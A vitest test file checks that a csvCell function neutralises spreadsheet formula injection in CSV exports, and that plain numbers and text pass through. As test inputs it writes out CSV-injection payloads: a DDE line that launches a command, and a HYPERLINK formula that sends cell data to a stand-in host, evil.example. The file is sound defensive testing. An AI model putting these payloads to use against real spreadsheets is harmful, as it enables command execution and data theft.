import { expect, it } from 'vitest';
import { csvCell } from './components.tsx';

// Names arrive from outside (the website API, Excel imports, phone stock counts) and end up in CSV exports.
it('keeps a name that starts like a formula as text in Excel', () => {
  expect(csvCell("=cmd|' /C calc'!A0")).toBe("'=cmd|' /C calc'!A0");
  expect(csvCell('@SUM(1+1)')).toBe("'@SUM(1+1)");
  expect(csvCell('+9647501234567x')).toBe("'+9647501234567x");
  expect(csvCell('\t=1+1')).toBe("'\t=1+1");
  expect(csvCell('=HYPERLINK("http://evil.example/?x="&A1,"Open statement")')).toBe('"\'=HYPERLINK(""http://evil.example/?x=""&A1,""Open statement"")"');
});

it('leaves plain numbers and ordinary text as they were', () => {
  expect(csvCell(-5000)).toBe('-5000');
  expect(csvCell('-5000')).toBe('-5000');
  expect(csvCell('-1,250.50')).toBe('"-1,250.50"');
  expect(csvCell('Mer')).toBe('Mer');
  expect(csvCell('a, b')).toBe('"a, b"');
  expect(csvCell('line\r\nbreak')).toBe('"line\r\nbreak"');
});
